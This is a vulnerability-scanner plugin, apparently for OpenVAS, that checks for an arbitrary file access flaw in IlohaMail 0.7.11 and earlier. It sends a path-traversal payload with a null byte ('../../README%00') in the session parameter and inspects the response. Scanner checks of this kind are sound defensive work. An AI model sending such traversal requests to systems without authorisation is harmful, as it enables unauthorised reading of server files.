CPE = "cpe:/a:ilohamail:ilohamail";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14631" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_xref( name: "OSVDB", value: "7335" );
	script_name( "IlohaMail Arbitrary File Access via Session Variable Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Remote file access" );
	script_dependencies( "ilohamail_detect.sc" );
	script_mandatory_keys( "ilohamail/detected" );
	script_tag( name: "solution", value: "Upgrade to IlohaMail version 0.7.12 or later." );
	script_tag( name: "summary", value: "The target is running at least one instance of IlohaMail version
  0.7.11 or earlier. Such versions contain a flaw in the processing of the session variable that allows
  an unauthenticated attacker to retrieve arbitrary files available to the web user, provided the
  filesystem backend is in use." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
file = "../../README";
url = dir + "/index.php?session=" + file + "%00";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(isnull( res )){
	exit( 0 );
}
lines = split( res );
nlines = max_index( lines ) - 1;
for(i = 0;i <= nlines;i++){
	if(IsMatchRegexp( lines[i], "</HEAD>" )){
		next = lines[i + 1];
		if(!IsMatchRegexp( next, "Session timeout" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
		break;
	}
}
exit( 99 );

